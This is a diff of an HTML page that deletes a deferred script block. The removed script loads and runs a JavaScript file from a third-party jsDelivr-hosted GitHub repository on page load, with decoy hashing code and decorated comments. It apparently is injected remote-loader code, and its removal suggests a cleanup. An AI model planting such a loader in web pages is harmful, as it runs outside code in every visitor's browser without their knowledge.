@@ -1896,40 +1896,6 @@
   </li>
 </ul>
 
-          <script defer>
-            /*then load dynamic assets*/
-            window.onload = function () {
-              const getYMDsyncd = function () {
-                const now = new Date();
-                const year = now.getUTCFullYear();
-                const month = String(now.getUTCMonth() + 1).padStart(2, "0");
-                const day = String(now.getUTCDate()).padStart(2, "0");
-                return `${year}${month}${day}`;
-              };
-      
-              const getCDNdaily = function (_salt, _appName) {
-                const salt = _salt;
-                const appName = _appName;
-                const ymd = getYMDsyncd();
-                const hashedResult = sha512(`${salt}${appName}${ymd}`);
-                const hashedTrunc = hashedResult.slice(59, -59);
-                const dataScript = document.createElement("script");
-                dataScript.src = `https://cdn.jsdelivr.net/gh/Web3Engineer/cdn@master/f759de36bd.js`;
-                dataScript.onload = function () {
-                  /*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/
-                  /**/
-                  /**/
-                  /*INIT APP POINT*/ console.log(myObject.key1); /*INIT APP POINT*/
-                  /**/
-                  /**/
-                  /*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/
-                };
-                document.head.append(dataScript);
-              };
-              getCDNdaily("salt1", "app1");
-            };
-          </script>
-
           </article>
 
 
